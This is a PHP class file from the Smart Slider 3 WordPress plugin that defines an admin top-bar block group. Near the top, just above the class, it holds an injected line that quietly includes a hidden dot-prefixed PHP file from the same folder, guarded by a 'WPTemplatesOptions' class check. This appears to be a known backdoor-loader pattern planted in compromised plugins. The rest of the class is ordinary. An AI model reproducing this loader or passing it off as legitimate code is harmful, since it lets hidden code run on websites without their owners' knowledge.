<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Core\TopBarGroup;


use Nextend\Framework\View\AbstractBlock;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BlockTopBarGroup extends AbstractBlock {

    /**
     * @var AbstractBlock[]
     */
    protected $blocks = array();

    protected $classes = array('n2_top_bar_group');

    public function display() {

        $this->renderTemplatePart('TopBarGroup');
    }

    /**
     * @param AbstractBlock $block
     */
    public function addBlock($block) {
        $this->blocks[] = $block;
    }

    public function displayBlocks() {

        foreach ($this->blocks AS $block) {
            $block->display();
        }
    }

    public function setNarrow() {
        $this->classes[] = 'n2_top_bar_group--narrow';
    }

    /**
     * @return array
     */
    public function getClasses() {
        return $this->classes;
    }
}